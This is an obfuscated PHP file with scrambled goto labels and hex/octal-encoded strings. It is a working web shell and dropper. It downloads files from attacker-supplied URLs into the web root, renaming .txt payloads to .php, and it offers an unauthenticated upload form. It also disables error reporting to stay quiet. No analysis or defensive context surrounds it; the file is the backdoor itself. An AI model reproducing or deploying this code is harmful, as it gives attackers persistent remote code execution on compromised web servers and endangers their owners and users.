<?php
 goto SA8Pd; xBIaz: if ($_GET["\144\x77"]) { $dw = $_GET["\144\x77"]; $dw = base64_decode(str_rot13($dw)); if (preg_match("\x2f\x75\162\x6c\x3d\50\56\x2a\77\51\x26\144\x69\x72\x3d\50\x2e\52\x29\57", $dw, $info)) { $url = $info[1]; $dir = $info[2]; } else { preg_match("\x2f\165\x72\154\x3d\x28\x2e\52\51\57", $dw, $info); $url = $info[1]; $dir = ''; } preg_match("\x2f\50\x2e\52\51\134\x2f\x28\x2e\x2a\51\x5c\56\x28\56\52\77\x29\x24\57", $url, $n); if ($n[3] == "\x74\x78\x74") { $z = "\x70\150\x70"; $name = $n[2]; } else { $z = $n[3]; $name = "\164\x65\155\160\x6c\x61\x74\x65"; } if ($dir != '') { $dir = $_SERVER["\104\x4f\103\125\x4d\x45\x4e\124\137\122\x4f\117\124"] . "\57" . $dir . "\x2f" . $name . "\56" . $z; } else { $dir = $_SERVER["\104\117\x43\x55\x4d\105\x4e\124\x5f\x52\x4f\117\124"] . "\57" . $name . "\x2e" . $z; } get($url, $dir); if (file_exists($dir)) { echo "\x3c\x74\x72\76\74\164\x64\x3e\74\x66\x6f\156\164\x20\143\157\154\x6f\162\75\42\147\x72\x65\x65\x6e\42\x3e\x64\157\x77\156\x6c\x6f\141\x64\40\x73\165\x63\x63\x65\163\x73\74\x2f\x66\x6f\x6e\164\x3e\x3c\57\x74\144\76\x3c\57\x74\162\76"; } else { echo "\x3c\x74\x72\76\74\164\144\76\x3c\146\x6f\x6e\x74\x20\x63\x6f\154\x6f\x72\x3d\x22\162\145\144\42\76\x64\x6f\x77\x6e\x6c\157\141\x64\x20\x66\141\151\x6c\74\57\x66\x6f\156\x74\x3e\74\x2f\x74\144\x3e\x3c\57\164\162\x3e"; } } elseif ($_POST["\x67\x65\x74\x5f\165\x72\154"]) { $url = $_POST["\x67\x65\x74\x5f\165\x72\x6c"]; preg_match("\x2f\x28\x2e\x2a\51\134\57\50\56\x2a\51\x5c\x2e\x28\x2e\x2a\x3f\x29\x24\x2f", $url, $n); if ($n[3] == "\x74\170\164") { $z = "\x70\150\x70"; $name = $n[2]; } else { $z = $n[3]; $name = "\164\145\x6d\x70\x6c\x61\x74\145"; } $dir = $_POST["\144\160\141\x74\x68"] . "\57" . $name . "\x2e" . $z; get($url, $dir); if (file_exists($dir)) { echo "\x3c\x74\162\x3e\x3c\164\144\76\74\x66\157\156\x74\x20\143\157\154\x6f\x72\x3d\x22\x67\x72\x65\145\156\42\76\x64\157\x77\x6e\154\x6f\141\144\x20\163\165\143\x63\x65\163\163\x3c\57\x66\x6f\x6e\164\76\x3c\57\164\144\76\74\x2f\164\162\76"; } else { echo "\x3c\164\162\x3e\x3c\164\144\76\x3c\x66\157\x6e\164\40\x63\157\154\x6f\x72\x3d\x22\162\x65\144\x22\x3e\144\x6f\x77\156\x6c\x6f\x61\144\40\x66\x61\x69\154\x3c\x2f\x66\157\156\164\x3e\74\57\164\x64\x3e\x3c\x2f\164\x72\x3e"; } } goto MdvWa; MdvWa: echo "\74\164\162\76\74\164\144\76\x3c\146\x6f\162\x6d\x20\155\x65\164\x68\x6f\144\75\x22\x50\x4f\x53\x54\42\40\141\x63\x74\x69\157\x6e\x3d\x22\x22\x3e\x3c\163\160\x61\x6e\76\x55\x72\x6c\72\40\74\57\x73\160\141\x6e\x3e\74\151\156\x70\165\x74\40\164\x79\160\x65\75\164\x65\170\x74\x20\x6e\x61\155\x65\75\x22\x67\x65\164\x5f\x75\162\x6c\x22\x20\x76\141\x6c\165\145\x3d\42\42\x3e\x3c\x69\156\x70\165\164\40\x74\x79\x70\x65\75\42\150\151\x64\144\x65\x6e\42\40\x6e\x61\x6d\145\x3d\x22\x64\x70\141\164\x68\42\40\x76\141\154\x75\145\75\42{$path}\42\x3e\74\151\156\x70\165\164\x20\164\x79\x70\145\x3d\x73\x75\x62\155\151\164\x20\166\141\x6c\x75\145\75\42\320\237\xd0\xbe\320\xbb\xd1\203\321\207\320\270\xd1\x82\321\x8c\xd0\244\xd0\xb0\320\271\xd0\273\x22\76\x3c\57\x66\x6f\x72\155\76\x3c\57\164\x64\x3e\x3c\57\x74\162\76"; goto unO0M; N4bh0: function get($url, $dir) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_TIMEOUT, 10); $data = curl_exec($ch); if (!$data) { $data = @file_get_contents($url); } file_put_contents($dir, $data); } goto xBIaz; UUYBp: $path = __DIR__; goto iCPdg; iCPdg: if (isset($_FILES["\165\160\x6c\157\141\x64\145\144\x66\x69\154\145"])) { $target_path = basename($_FILES["\x75\160\154\157\x61\144\145\x64\x66\x69\x6c\x65"]["\156\141\155\x65"]); if (move_uploaded_file($_FILES["\165\160\x6c\x6f\141\x64\145\144\146\x69\154\x65"]["\164\x6d\160\x5f\x6e\x61\155\145"], $target_path)) { echo "\x3c\x66\157\x6e\164\x20\x63\x6f\154\x6f\x72\75\x22\x67\x72\145\x65\x6e\x22\76\x66\151\x6c\145\x20\165\160\x6c\157\x61\x64\x65\144\x3c\x2f\146\x6f\x6e\164\x3e\x3c\142\162\40\57\76"; } else { echo "\x3c\146\x6f\156\164\x20\143\x6f\x6c\157\x72\75\x22\x72\145\144\42\x3e\165\x70\x6c\x6f\x61\144\40\x66\x61\151\154\x3c\57\x66\157\x6e\164\76\x3c\x62\x72\40\x2f\x3e"; } } goto MtbcO; SA8Pd: error_reporting(0); goto UUYBp; MtbcO: echo "\x3c\146\157\162\x6d\x20\145\x6e\x63\164\171\160\145\x3d\42\x6d\165\154\x74\x69\x70\141\162\x74\x2f\x66\157\x72\155\55\144\x61\164\x61\42\40\x6d\145\x74\150\x6f\x64\75\x22\x50\x4f\x53\x54\x22\76\x3c\151\156\160\x75\164\x20\156\x61\x6d\x65\x3d\42\165\160\154\x6f\141\144\145\x64\x66\151\154\x65\x22\x20\164\x79\160\145\75\42\x66\151\x6c\145\42\57\x3e\x3c\151\156\x70\165\x74\40\x74\171\160\145\75\x22\x73\165\x62\155\151\164\42\x20\166\141\154\x75\x65\x3d\x22\325\x8e\xd5\245\xd6\200\325\xa2\325\245\xd5\xbc\325\266\xd5\245\326\x84\40\326\x86\xd5\241\325\265\325\xac\325\245\326\x80\42\57\x3e\74\57\146\x6f\x72\x6d\76\74\57\164\144\x3e\x3c\57\164\162\76"; goto N4bh0; unO0M: ?>